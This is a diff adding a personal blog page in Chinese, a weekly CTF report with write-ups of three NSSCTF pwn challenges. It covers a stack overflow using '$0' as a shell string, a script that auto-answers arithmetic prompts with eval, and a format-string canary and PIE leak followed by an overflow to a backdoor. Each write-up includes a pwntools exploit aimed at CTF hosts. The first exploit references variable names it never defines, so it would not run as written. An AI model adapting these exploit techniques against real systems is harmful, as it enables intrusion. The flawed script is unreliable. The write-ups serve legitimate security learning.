@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>第一次周报 | BW-jitang</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://jitang-BW.github.io/favicon.ico?v=1706626864717">
+<link rel="stylesheet" href="https://jitang-BW.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="where_is_shell
+
+一道很简单的栈溢出漏洞，但是没有system要的/bin/sh，找到了tips中
+
+地址在0x400541开始的\x24\x30也是可以当作/bin/sh使用
+新知识：$0可以当/bin/sh使用，$0的机器..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://jitang-BW.github.io">
+        <img src="https://jitang-BW.github.io/images/avatar.png?v=1706626864717" class="site-logo">
+        <h1 class="site-title">BW-jitang</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jitang-BW.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">第一次周报</h2>
+            <div class="post-date">2024-01-30</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="where_is_shell">where_is_shell</h1>
+<figure data-type="image" tabindex="1"><img src="https://jitang-BW.github.io/post-images/1706624916116.png" alt="" loading="lazy"></figure>
+<p>一道很简单的栈溢出漏洞，但是没有system要的/bin/sh，找到了tips中</p>
+<figure data-type="image" tabindex="2"><img src="https://jitang-BW.github.io/post-images/1706625081301.png" alt="" loading="lazy"></figure>
+<p>地址在0x400541开始的\x24\x30也是可以当作/bin/sh使用</p>
+<p>新知识：$0可以当/bin/sh使用，$0的机器码就是\x24\x30</p>
+<p>然后就是比较正常的栈溢出</p>
+<figure data-type="image" tabindex="3"><img src="https://jitang-BW.github.io/post-images/1706625265417.png" alt="" loading="lazy"></figure>
+<p>exp:</p>
+<pre><code>from pwn import *
+
+context(log_level='debug',arch='amd64',os='linux')
+context.terminal = ['tmux', 'splitw', '-h']
+#p=process('./pwn')
+p = remote('node4.anna.nssctf.cn',28599)
+
+bin_sh = 0x0400541
+system = 0x0400430
+ret = 0x0400416
+pop_rdi = 0x04005e3
+
+payload = b'a' * (0x10+8) + p64(ret_add) + p64(pop_rdi_add) + p64(bin_sh_add) + p64(system_add)
+
+p.sendline(payload)
+p.interactive()
+
+</code></pre>
+<h1 id="口算题卡">口算题卡</h1>
+<p>对于这类题一直不太知道怎么写脚本，所以特意找了一道题来做</p>
+<figure data-type="image" tabindex="4"><img src="https://jitang-BW.github.io/post-images/1706625477508.png" alt="" loading="lazy"></figure>
+<p>nc后可以看到要做100道简单计算题</p>
+<p>exp:</p>
+<pre><code>from pwn import *
+
+context(log_level = &quot;debug&quot;,arch = &quot;amd64&quot;,os = &quot;linux&quot;)
+
+
+p = remote('node4.anna.nssctf.cn', 28164)
+
+i = 0
+while i&lt;101:
+    p.recvuntil(b'What is ')
+    a = p.recvline().strip().strip(b'?').decode()   
+    # decode:解码bytes到str        
+    b = str(eval(a)).encode()     
+    #encode:解码str到bytes                       
+    print(b)
+    p.sendline(b)
+    i += 1
+p.interactive()
+
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://jitang-BW.github.io/post-images/1706625635064.png" alt="" loading="lazy"></figure>
+<h1 id="find_flag">find_flag</h1>
+<figure data-type="image" tabindex="6"><img src="https://jitang-BW.github.io/post-images/1706625839183.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://jitang-BW.github.io/post-images/1706626026301.png" alt="" loading="lazy"></figure>
+<p>可以看到canary保护和pie保护，通过格式化字符串泄露canary位置然后第二个gets溢出</p>
+<figure data-type="image" tabindex="8"><img src="https://jitang-BW.github.io/post-images/1706626126880.png" alt="" loading="lazy"></figure>
+<p>通过动态调试，在printf和gets处下断点，输入aaaaaaa...，不难发现rbp上面的就是canary，下面的就是返回地址，因为rdi是栈上的第一个地址，调试过程中的输入分别在6个寄存器中，所以canary的位置是17，返回位置是19</p>
+<figure data-type="image" tabindex="9"><img src="https://jitang-BW.github.io/post-images/1706626472816.png" alt="" loading="lazy"></figure>
+<p>返回地址减去偏移就是程序的基地址，因为操作的函数就是sub_132F,所以下面的0x146F就是返回地址的偏移地址</p>
+<figure data-type="image" tabindex="10"><img src="https://jitang-BW.github.io/post-images/1706626618400.png" alt="" loading="lazy"></figure>
+<p>这里的0x1231就是system函数的偏移</p>
+<p>最后通过ida中的canary位置把canary复原</p>
+<p>exp:</p>
+<pre><code>from pwn import *
+
+context(log_level = &quot;debug&quot;,arch = &quot;amd64&quot;,os = &quot;linux&quot;)
+
+
+p = remote('node4.anna.nssctf.cn',28105)
+
+payload = b'%17$p.%19$p'
+p.sendlineafter(b&quot;your name?&quot;, payload)
+p.recvuntil(b'0x')
+canary = int(p.recv(16), 16)
+p.recvuntil(b'0x')
+elf_base = int(p.recv(12), 16) - 0x146f
+
+backdoor = elf_base + 0x1231
+payload = b'a' * (0x40 - 0x08) + p64(canary) + b'a' * (0x08) + p64(backdoor)
+p.sendlineafter(b&quot;Anything else?&quot;, payload)
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://jitang-BW.github.io/post-images/1706626827038.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://jitang-BW.github.io/post/rop-emporium-zhi-zai-kan-fluff-yu-ret2csu/">
+                  <h3 class="post-title">
+                    rop emporium之再看fluff与ret2csu
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
